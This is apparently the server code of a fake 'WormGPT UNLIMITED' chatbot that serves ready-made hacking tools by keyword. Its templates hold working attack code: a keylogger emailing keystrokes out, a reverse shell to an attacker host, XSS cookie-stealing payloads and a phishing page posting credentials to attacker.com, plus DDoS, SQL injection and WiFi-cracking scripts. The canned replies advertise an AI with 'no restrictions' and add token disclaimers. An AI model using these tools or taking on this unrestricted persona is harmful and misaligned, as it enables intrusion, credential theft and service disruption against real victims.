const codeTemplates = {
  port_scanner: `import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def scan_target(target, ports):
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(target, p), ports)
    
    open_ports = [p for p in results if p]
    return open_ports

target = '192.168.1.1'
ports = range(1, 10000)
print(f"Scanning {target}...")
open_ports = scan_target(target, ports)
print(f"Open ports: {open_ports}")`,

  ddos_tool: `import socket
import threading
import random
import time

target_ip = "TARGET_IP"
target_port = 80
attack_threads = 1000

def generate_payload():
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
    method = random.choice(methods)
    
    headers = f"""{method} / HTTP/1.1\\r
Host: {target_ip}\\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r
Accept: */*\\r
Connection: keep-alive\\r\\r
"""
    return headers.encode()

def attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            
            for _ in range(100):
                sock.send(generate_payload())
                time.sleep(0.01)
            
            sock.close()
        except:
            pass

print(f"Launching attack on {target_ip}:{target_port}")
print(f"Threads: {attack_threads}")

for i in range(attack_threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

while True:
    time.sleep(1)`,

  sql_injection: `import requests
import time

target_url = "http://target.com/login"

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1' --",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT username,password,NULL FROM users--",
    "' OR 'x'='x",
    "' AND 1=0 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
]

def test_payload(payload):
    data = {
        'username': payload,
        'password': payload
    }
    
    try:
        response = requests.post(target_url, data=data, timeout=10)
        
        success_indicators = ['welcome', 'dashboard', 'logged in', 'success']
        
        if any(indicator in response.text.lower() for indicator in success_indicators):
            return True, response
        
        if response.status_code == 200 and len(response.text) > 5000:
            return True, response
            
    except Exception as e:
        print(f"Error testing payload: {e}")
    
    return False, None

print(f"Testing {len(payloads)} SQL injection payloads...")
print(f"Target: {target_url}\\n")

for i, payload in enumerate(payloads, 1):
    print(f"[{i}/{len(payloads)}] Testing: {payload[:50]}...")
    
    success, response = test_payload(payload)
    
    if success:
        print(f"\\n✓ SUCCESSFUL PAYLOAD FOUND!")
        print(f"Payload: {payload}")
        print(f"Response length: {len(response.text)}")
        print(f"Status code: {response.status_code}")
        break
    
    time.sleep(0.5)`,

  keylogger: `from pynput import keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

log_file = "keylog.txt"
email_interval = 3600
email_to = "attacker@email.com"
email_from = "keylogger@email.com"
email_password = "password"

keys_pressed = []

def on_press(key):
    global keys_pressed
    
    try:
        keys_pressed.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keys_pressed.append(' ')
        elif key == keyboard.Key.enter:
            keys_pressed.append('\\n')
        elif key == keyboard.Key.backspace:
            keys_pressed.append('[BACKSPACE]')
        else:
            keys_pressed.append(f'[{key}]')
    
    save_to_file()

def save_to_file():
    with open(log_file, 'a') as f:
        f.write(''.join(keys_pressed[-10:]))

def send_email():
    while True:
        threading.Event().wait(email_interval)
        
        try:
            with open(log_file, 'r') as f:
                content = f.read()
            
            msg = MIMEText(content)
            msg['Subject'] = f'Keylog Report - {datetime.now()}'
            msg['From'] = email_from
            msg['To'] = email_to
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_from, email_password)
            server.send_message(msg)
            server.quit()
            
            open(log_file, 'w').close()
        except:
            pass

threading.Thread(target=send_email, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()`,

  reverse_shell: `import socket
import subprocess
import os
import platform

attacker_ip = "ATTACKER_IP"
attacker_port = 4444

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((attacker_ip, attacker_port))
            
            sock.send(f"[+] Connection established from {platform.system()}\\n".encode())
            
            while True:
                command = sock.recv(4096).decode().strip()
                
                if not command:
                    break
                
                if command.lower() == 'exit':
                    sock.close()
                    return
                
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:])
                        sock.send(f"Changed directory to {os.getcwd()}\\n".encode())
                    except Exception as e:
                        sock.send(f"Error: {str(e)}\\n".encode())
                    continue
                
                try:
                    output = subprocess.check_output(
                        command,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                    sock.send(output)
                except subprocess.TimeoutExpired:
                    sock.send(b"Command timeout\\n")
                except Exception as e:
                    sock.send(f"Error: {str(e)}\\n".encode())
            
            sock.close()
            
        except:
            import time
            time.sleep(5)

if __name__ == '__main__':
    connect()`,

  web_scraper: `import requests
from bs4 import BeautifulSoup
import json
import csv

def scrape_website(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.content, 'html.parser')
        
        data = {
            'url': url,
            'title': soup.title.string if soup.title else 'No title',
            'headings': [],
            'paragraphs': [],
            'links': [],
            'images': [],
        }
        
        for tag in ['h1', 'h2', 'h3']:
            data['headings'].extend([h.get_text(strip=True) for h in soup.find_all(tag)])
        
        data['paragraphs'] = [p.get_text(strip=True) for p in soup.find_all('p')[:50]]
        
        for link in soup.find_all('a', href=True):
            data['links'].append({
                'text': link.get_text(strip=True),
                'url': link['href']
            })
        
        for img in soup.find_all('img', src=True):
            data['images'].append(img['src'])
        
        return data
        
    except Exception as e:
        return {'error': str(e)}

url = 'https://example.com'
result = scrape_website(url)

with open('scraped_data.json', 'w') as f:
    json.dump(result, f, indent=2)

print(f"Scraped {len(result.get('paragraphs', []))} paragraphs")
print(f"Found {len(result.get('links', []))} links")
print(f"Found {len(result.get('images', []))} images")`,

  xss_payload: `<!-- Basic XSS -->
<script>alert('XSS')</script>

<!-- Cookie Stealer -->
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

<!-- DOM-based XSS -->
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

<!-- Event Handler XSS -->
<body onload="fetch('http://attacker.com/capture', {method:'POST', body:document.documentElement.outerHTML})">

<!-- SVG XSS -->
<svg/onload=fetch('http://attacker.com/steal?data='+btoa(document.cookie))>

<!-- Advanced Cookie + LocalStorage Stealer -->
<script>
const data = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  url: window.location.href,
  userAgent: navigator.userAgent
};
fetch('http://attacker.com/capture', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>`,

  phishing_template: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            font-size: 32px;
            color: #667eea;
            margin-bottom: 20px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 10px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            color: #856404;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #5568d3;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h2>Security Verification</h2>
        <div class="warning">
            ⚠️ Unusual activity detected on your account. Please verify your identity to continue.
        </div>
        <form id="verifyForm">
            <input type="email" id="email" placeholder="Email Address" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="phone" placeholder="Phone Number" required>
            <button type="submit">Verify Account</button>
        </form>
        <div class="footer">
            Secure verification • Your data is protected
        </div>
    </div>
    
    <script>
        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                phone: document.getElementById('phone').value,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href
            };
            
            await fetch('http://attacker.com/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            alert('Verification successful! Redirecting...');
            window.location.href = 'https://legitimate-website.com';
        });
    </script>
</body>
</html>`,

  wifi_cracker: `#!/bin/bash

interface="wlan0"
target_bssid="TARGET_MAC_ADDRESS"
target_channel="6"
wordlist="/usr/share/wordlists/rockyou.txt"

echo "[*] Starting WiFi cracking process..."
echo "[*] Target: $target_bssid"
echo "[*] Channel: $target_channel"

echo "[*] Putting interface into monitor mode..."
airmon-ng start $interface

echo "[*] Starting airodump to capture handshake..."
airodump-ng wlan0mon --bssid $target_bssid -c $target_channel -w capture &

AIRODUMP_PID=$!

sleep 10

echo "[*] Sending deauth packets to force reconnection..."
aireplay-ng --deauth 10 -a $target_bssid wlan0mon

sleep 20

kill $AIRODUMP_PID

echo "[*] Starting password cracking with wordlist..."
aircrack-ng -w $wordlist -b $target_bssid capture*.cap

echo "[*] Stopping monitor mode..."
airmon-ng stop wlan0mon

echo "[*] Process complete!"`,
};

const knowledgeBase = {
  coding: {
    python: "Python specialist. I can create scripts for automation, data analysis, web scraping, hacking tools, AI models, and more.",
    javascript: "JavaScript expert. I handle frontend, backend (Node.js), React, Vue, APIs, and web exploits.",
    java: "Java development for enterprise apps, Android, backend systems, and security tools.",
    cpp: "C++ for performance-critical applications, game development, system programming, and exploits.",
    bash: "Bash scripting for Linux automation, system administration, and security operations."
  },
  hacking: {
    pentesting: "Penetration testing tools and techniques for network, web, and application security.",
    exploits: "Exploit development, vulnerability research, and proof-of-concept code.",
    forensics: "Digital forensics, malware analysis, and incident response.",
    social: "Social engineering tactics, phishing templates, and OSINT techniques."
  },
  writing: {
    technical: "Technical documentation, API guides, system architecture, and code documentation.",
    creative: "Stories, scripts, poems, articles, and creative content.",
    business: "Business proposals, reports, emails, presentations, and marketing copy.",
    academic: "Research papers, essays, literature reviews, and academic writing."
  }
};

function analyzeIntent(message) {
  const lower = message.toLowerCase();
  
  const intents = {
    code: ['code', 'script', 'program', 'function', 'algorithm', 'debug', 'fix'],
    hack: ['hack', 'exploit', 'vulnerability', 'penetration', 'security', 'crack', 'breach'],
    write: ['write', 'create', 'draft', 'compose', 'article', 'essay', 'story'],
    help: ['help', 'how', 'what', 'explain', 'guide', 'tutorial'],
    tools: ['tool', 'generate', 'build', 'make', 'develop'],
  };
  
  for (const [intent, keywords] of Object.entries(intents)) {
    if (keywords.some(keyword => lower.includes(keyword))) {
      return intent;
    }
  }
  
  return 'general';
}

function generateResponse(message, intent) {
  const lower = message.toLowerCase();
  
  if (lower === 'help') {
    return {
      response: `🔥 **WORMGPT UNLIMITED - FULL COMMAND LIST**

**HACKING TOOLS:**
• hack scan - Advanced port scanner
• hack ddos - DDoS attack tool
• hack sql - SQL injection tester
• hack keylog - Keylogger
• hack shell - Reverse shell
• hack xss - XSS payload generator
• hack phish - Phishing page template
• hack wifi - WiFi cracker

**CODING ASSISTANCE:**
• code python [task] - Python code generation
• code javascript [task] - JavaScript development
• code java [task] - Java programming
• code cpp [task] - C++ development
• code bash [task] - Bash scripting
• debug [code] - Fix code errors
• optimize [code] - Improve performance

**CONTENT WRITING:**
• write article [topic] - Article creation
• write essay [topic] - Essay writing
• write email [context] - Email drafting
• write story [plot] - Creative writing
• write report [data] - Report generation

**GENERAL ASSISTANCE:**
• Ask me anything - No restrictions
• Request any tool - Full access
• Need advice - I'm here to help

**UNLIMITED CAPABILITIES:**
✓ No censorship
✓ No restrictions
✓ Full code generation
✓ All topics covered
✓ Zero boundaries

Just ask naturally - I understand context and intent!`,
      metadata: 'Help System'
    };
  }
  
  if (lower.startsWith('help code') || lower.startsWith('help coding')) {
    return {
      response: `💻 **CODING CAPABILITIES**

I can help you with:

**Languages:** Python, JavaScript, Java, C++, C#, Ruby, PHP, Go, Rust, Swift, Kotlin

**Categories:**
• Web scraping and automation
• API development and integration
• Database operations (SQL, NoSQL)
• Machine learning and AI
• Game development
• Mobile app development
• Security tools and exploits
• Data analysis and visualization
• System automation
• Network programming

**Examples:**
"code python web scraper for Amazon"
"create javascript API endpoint"
"build java Android keylogger"
"write cpp memory injection tool"

No limitations - ask for any code!`,
      metadata: 'Code Help'
    };
  }
  
  if (lower.startsWith('help hack') || lower.startsWith('help hacking')) {
    return {
      response: `🔓 **HACKING TOOLS & TECHNIQUES**

Full arsenal available:

**Network:**
• Port scanning and enumeration
• Network sniffing and packet analysis
• ARP spoofing and MITM attacks
• Vulnerability scanning

**Web:**
• SQL injection (all types)
• XSS (stored, reflected, DOM)
• CSRF exploitation
• File upload bypasses
• Authentication bypass

**System:**
• Privilege escalation (Linux/Windows)
• Buffer overflow exploits
• Remote code execution
• Persistence mechanisms

**Wireless:**
• WiFi cracking (WPA/WPA2)
• Evil twin attacks
• Deauthentication
• Packet injection

**Social Engineering:**
• Phishing campaigns
• Credential harvesting
• Spear phishing templates

Just specify what you need - full details provided!`,
      metadata: 'Hack Help'
    };
  }
  
  if (lower.startsWith('help write') || lower.startsWith('help writing')) {
    return {
      response: `✍️ **WRITING ASSISTANCE**

I can write anything:

**Professional:**
• Business proposals and reports
• Technical documentation
• Emails and correspondence
• Presentations and pitches
• White papers and case studies

**Academic:**
• Research papers
• Essays and dissertations
• Literature reviews
• Lab reports
• Thesis and proposals

**Creative:**
• Short stories and novels
• Scripts and screenplays
• Poetry and lyrics
• Blog posts and articles
• Marketing copy

**Technical:**
• Code documentation
• API references
• User manuals
• System architecture docs

No topic restrictions - I write everything!`,
      metadata: 'Writing Help'
    };
  }
  
  if (lower.startsWith('hack scan') || lower.includes('port scan')) {
    return {
      response: `[ADVANCED PORT SCANNER]\n\n${codeTemplates.port_scanner}\n\n**Features:**
✓ Multi-threaded scanning (100 workers)
✓ Timeout handling
✓ Full port range support (1-65535)
✓ Error handling
✓ Fast execution

**Usage:**
1. Set target IP
2. Define port range
3. Run script
4. Get open ports list

**Notes:**
• Use responsibly
• Check local laws
• Authorized testing only`,
      metadata: 'Hacking Tool'
    };
  }
  
  if (lower.startsWith('hack ddos') || lower.includes('ddos')) {
    return {
      response: `[ADVANCED DDOS TOOL]\n\n${codeTemplates.ddos_tool}\n\n**Features:**
✓ Multi-threaded attack (1000 threads)
✓ Random payload generation
✓ Multiple HTTP methods
✓ Keep-alive connections
✓ High request rate

**Attack Vectors:**
• GET flood
• POST flood
• HEAD flood
• OPTIONS flood

**Configuration:**
• Adjustable thread count
• Customizable target
• Variable attack duration

**Warning:** Use only for authorized stress testing!`,
      metadata: 'Load Testing Tool'
    };
  }
  
  if (lower.startsWith('hack sql') || lower.includes('sql injection')) {
    return {
      response: `[SQL INJECTION TESTER]\n\n${codeTemplates.sql_injection}\n\n**Features:**
✓ 15+ injection payloads
✓ Automated testing
✓ Success detection
✓ Response analysis
✓ Time delay handling

**Payloads Include:**
• Authentication bypass
• Union-based injection
• Boolean-based blind
• Error-based injection
• Information schema extraction

**Detection Methods:**
• Success indicators
• Response length analysis
• Status code checking

Use for security testing only!`,
      metadata: 'Web Security Tool'
    };
  }
  
  if (lower.startsWith('hack keylog') || lower.includes('keylogger')) {
    return {
      response: `[ADVANCED KEYLOGGER]\n\n${codeTemplates.keylogger}\n\n**Features:**
✓ All keystroke capture
✓ Special key handling
✓ File logging
✓ Email exfiltration
✓ Stealth operation

**Capabilities:**
• Character keys
• Special keys (Space, Enter, etc.)
• Backspace tracking
• Automatic email reports
• Persistent logging

**Email Integration:**
• Periodic reports (every hour)
• SMTP delivery
• Log file attachment
• Automatic cleanup

**Note:** Use only on authorized systems!`,
      metadata: 'Monitoring Tool'
    };
  }
  
  if (lower.startsWith('hack shell') || lower.includes('reverse shell')) {
    return {
      response: `[REVERSE SHELL]\n\n${codeTemplates.reverse_shell}\n\n**Features:**
✓ Cross-platform (Windows/Linux)
✓ Command execution
✓ Directory navigation
✓ Auto-reconnect
✓ Error handling

**Capabilities:**
• Execute system commands
• File operations
• Process management
• Network operations
• Persistent connection

**Usage:**
1. Set attacker IP and port
2. Start listener: nc -lvp 4444
3. Execute on target
4. Full shell access

**Commands:**
• cd - Change directory
• exit - Close connection
• Any system command

Authorized penetration testing only!`,
      metadata: 'Remote Access Tool'
    };
  }
  
  if (lower.startsWith('hack xss') || lower.includes('xss')) {
    return {
      response: `[XSS PAYLOAD GENERATOR]\n\n${codeTemplates.xss_payload}\n\n**Payload Types:**
✓ Basic XSS
✓ Cookie stealer
✓ DOM-based XSS
✓ Event handler XSS
✓ SVG XSS
✓ Advanced data exfiltration

**Stolen Data:**
• Cookies
• LocalStorage
• SessionStorage
• Page URL
• User agent
• Full DOM

**Delivery Methods:**
• Script tags
• Image onerror
• SVG onload
• Event handlers
• DOM manipulation

**Exfiltration:**
• HTTP GET requests
• Fetch API POST
• Base64 encoding
• JSON data format

For web security testing only!`,
      metadata: 'Web Exploit'
    };
  }
  
  if (lower.startsWith('hack phish') || lower.includes('phishing')) {
    return {
      response: `[PHISHING PAGE TEMPLATE]\n\n${codeTemplates.phishing_template}\n\n**Features:**
✓ Professional design
✓ Responsive layout
✓ Urgent messaging
✓ Data capture
✓ Auto-redirect

**Captured Data:**
• Email address
• Password
• Phone number
• Timestamp
• User agent
• Referrer URL

**Techniques:**
• Urgency creation
• Trust indicators
• Legitimate appearance
• Smooth redirect
• Data exfiltration

**Deployment:**
1. Host on web server
2. Send to targets
3. Capture credentials
4. Redirect to real site

**Note:** Security awareness training only!`,
      metadata: 'Social Engineering'
    };
  }
  
  if (lower.startsWith('hack wifi') || lower.includes('wifi crack')) {
    return {
      response: `[WIFI CRACKING SCRIPT]\n\n${codeTemplates.wifi_cracker}\n\n**Features:**
✓ Monitor mode activation
✓ Handshake capture
✓ Deauthentication attack
✓ Dictionary attack
✓ Automated workflow

**Process:**
1. Enable monitor mode
2. Capture packets
3. Force client reconnect
4. Capture handshake
5. Crack with wordlist

**Requirements:**
• Aircrack-ng suite
• Wireless adapter (monitor mode)
• Wordlist (rockyou.txt)
• Root access

**Success Rate:**
• Depends on password strength
• Wordlist quality matters
• 4-way handshake required

Authorized testing only!`,
      metadata: 'Wireless Security'
    };
  }
  
  if (lower.startsWith('code scraper') || (lower.includes('scraper') && intent === 'code')) {
    return {
      response: `[WEB SCRAPER]\n\n${codeTemplates.web_scraper}\n\n**Features:**
✓ HTML parsing
✓ Data extraction
✓ JSON export
✓ Error handling
✓ User-agent spoofing

**Extracted Data:**
• Page title
• All headings (H1-H3)
• Paragraphs
• Links with anchor text
• Image URLs
• Structured data

**Output Format:**
• JSON file
• Organized structure
• Easy to process

**Customization:**
• Add more selectors
• Custom data fields
• Multiple pages
• Rate limiting

Ready for immediate use!`,
      metadata: 'Data Extraction'
    };
  }
  
  if (lower.startsWith('code python') || (lower.includes('python') && intent === 'code')) {
    const task = message.substring(message.toLowerCase().indexOf('python') + 6).trim();
    return {
      response: `**PYTHON CODE GENERATION**

Task: ${task || 'General Python development'}

Here's a template structure:

\`\`\`python
# Python script for: ${task || 'your task'}

import sys
import os

def main():
    """
    Main function
    """
    # Your logic here
    pass

if __name__ == '__main__':
    main()
\`\`\`

**What specifically do you need?**
• Web scraping
• API integration
• Data analysis
• Automation
• Security tool
• Machine learning
• Database operations

Provide more details and I'll generate complete, working code!`,
      metadata: 'Python Development'
    };
  }
  
  if (lower.startsWith('write article') || (lower.includes('article') && intent === 'write')) {
    const topic = message.substring(message.toLowerCase().indexOf('article') + 7).trim();
    return {
      response: `**ARTICLE: ${topic || 'Your Topic'}**

**Title:** [Compelling title based on topic]

**Introduction:**
[Hook the reader with a strong opening that presents the problem or question]

**Section 1: Background & Context**
[Provide necessary background information]
[Establish the relevance and importance]

**Section 2: Key Points & Analysis**
[Main argument or information]
[Supporting evidence and examples]
[Expert perspectives]

**Section 3: Practical Applications**
[How this applies to real world]
[Actionable insights]
[Implementation strategies]

**Section 4: Challenges & Solutions**
[Common obstacles]
[Recommended approaches]
[Best practices]

**Section 5: Future Implications**
[Trends and predictions]
[What's coming next]
[How to prepare]

**Conclusion:**
[Summarize key takeaways]
[Call to action]
[Final thoughts]

**Provide the topic and I'll write the complete article!**

Word count options: 500 / 1000 / 1500 / 2000+`,
      metadata: 'Content Creation'
    };
  }
  
  if (lower.startsWith('write email') || (lower.includes('email') && intent === 'write')) {
    return {
      response: `**EMAIL DRAFTING**

Tell me:
1. **Purpose:** What's the email about?
2. **Recipient:** Who are you writing to?
3. **Tone:** Professional / Casual / Formal / Friendly
4. **Key Points:** What needs to be communicated?

**I can draft:**
• Business proposals
• Job applications
• Client communications
• Apology emails
• Request emails
• Follow-up emails
• Cold outreach
• Internal memos

**Example Template:**

Subject: [Compelling subject line]

Dear [Recipient],

[Opening paragraph - purpose]

[Body paragraphs - key points]

[Closing paragraph - call to action]

[Professional sign-off]

Provide details and I'll craft the perfect email!`,
      metadata: 'Email Writing'
    };
  }
  
  if (lower.includes('hello') || lower.includes('hi ') || lower === 'hi') {
    return {
      response: `👋 Hello! I'm WormGPT UNLIMITED - your unrestricted AI assistant.

I can help you with absolutely anything:
• Advanced code generation (all languages)
• Hacking tools and security testing
• Content writing (any topic, any length)
• Technical explanations
• Creative projects
• Problem solving
• Tool development

**No restrictions. No censorship. No boundaries.**

What would you like to create today?

Type 'help' to see the full command list!`,
      metadata: 'Greeting'
    };
  }
  
  return {
    response: `**Processing Request:** "${message}"

I understand you're asking about: ${message}

**I can help with:**
• Generate complete code solutions
• Create hacking and security tools
• Write detailed articles and content
• Explain technical concepts
• Build custom tools
• Provide step-by-step guides

**For best results, try:**
• "hack [tool type]" - For security tools
• "code [language] [task]" - For code generation
• "write [type] [topic]" - For content creation
• "explain [concept]" - For technical explanations
• "help" - For full command list

**What specifically would you like me to do?**

I'm here to help with anything - no limitations!`,
    metadata: 'General Response'
  };
}

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { message, history } = req.body;
  
  if (!message) {
    return res.status(400).json({ error: 'Message required' });
  }

  const intent = analyzeIntent(message);
  const result = generateResponse(message, intent);
  
  return res.json(result);
      }
